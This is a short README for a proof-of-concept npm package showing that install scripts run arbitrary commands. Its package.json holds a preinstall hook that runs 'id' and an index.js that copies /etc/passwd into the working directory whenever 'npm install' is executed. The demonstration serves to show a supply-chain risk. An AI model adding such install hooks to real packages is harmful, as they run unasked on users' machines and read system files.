# RCE PoC Package

This PoC package shows how arbitrary system commands and JavaScript code can be executed
when a malicious npm package is installed.

[![Video demo]](https://youtu.be/hFtL_4gvqog)

You can reproduce the proof of impact PoC from the video by following these steps:

1) On a machine with Node.js and npm installed, create a new directory
2) Save the index.js and package.json from this directory to your new directory
3) In the directory with both files, execute

```
npm install .
```

### index.js

```js
const fs = require('fs');

fs.copyFile("/etc/passwd", "etc_passwd.txt", (err) => {
  if (err) throw err;
  console.log("error");
});
```

This file will copy the contents of the /etc/passwd file to etc_passwd.txt.

### package.json

```json
{
  "name": "this-is-critical",
  "version": "1.3.37",
  "description": "Installing malicious packages from npm leads to RCE (a critical bug).",
  "main": "index.js",
  "scripts": {
    "test": "",
    "preinstall": "id > rce.txt && node index.js"
  },
  "author": "",
  "license": "ISC"
}
```

The commands in the preinstall section are executed when running npm install.

So by executing npm install, the output of id is saved to rce.txt and index.js is executed, which will save the /etc/passwd file to etc_passwd.txt